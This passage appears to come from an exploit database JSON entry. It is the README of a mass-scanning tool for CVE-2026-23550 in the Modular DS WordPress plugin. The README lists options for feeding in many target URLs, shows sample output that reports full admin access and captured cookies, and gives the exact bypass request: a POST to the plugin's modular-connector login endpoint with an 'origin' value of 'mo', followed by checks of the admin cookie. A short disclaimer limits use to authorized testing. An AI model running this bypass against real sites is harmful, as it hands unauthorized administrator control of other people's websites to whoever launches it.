--list\tRequired Targets file (1 URL/line)\t-\n-t, --threads\tMax concurrent threads\t20\n-o, --output\tVulnerable targets output file\tvulns.txt\nSample Output \ud83d\udda5\ufe0f\n\ntext\n\ud83d\udd25 CVE-2026-23550 Modular DS Scanner \ud83d\udd25\nTargets: 247 | Threads: 50 | Output: bounty_vulns.txt\n\n\u280b Scanning Modular DS...  127/247 (51%)\n\u2705 VULNERABLE: https://target.com\n\ud83d\udd25 FULL ADMIN ACCESS: target.com\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Status      \u2502 Target                              \u2502 Details    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 \ud83d\udd25 FULL     \u2502 https://target.com        \u2502 3 cookies  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\ud83d\udcbe 4 vulnerable targets \u2192 bounty_vulns.txt\n\nDetection Logic \ud83d\udd0d\n\ntext\n1. POST /wp-content/plugins/modular-ds/api/modular-connector/login {\"origin\":\"mo\"}\n2. \u2705 Check wordpress_logged_in_* admin cookie\n3. \u2705 Verify /wp-admin/ dashboard access\n4. \ud83d\udcbe Save confirmed FULL ADMIN ACCESS targets\n\nLegal & Ethical Use \u2696\ufe0f\n\ntext\n\u26a0\ufe0f  STRICTLY FOR:\n\u2705 Authorized pentesting\n\u2705 Bug bounty programs  \n\u2705 Security research labs\n\u2705 Owned infrastructure\n\n\u274c NEVER use on unauthorized targets\n\nRequirements \ud83d\udce6\n\ntext\nrequests>=2.31.0\nrich>=13.0.0",
            "language": "MARKDOWN"
        }
    ],
    "exploits_total": 200
}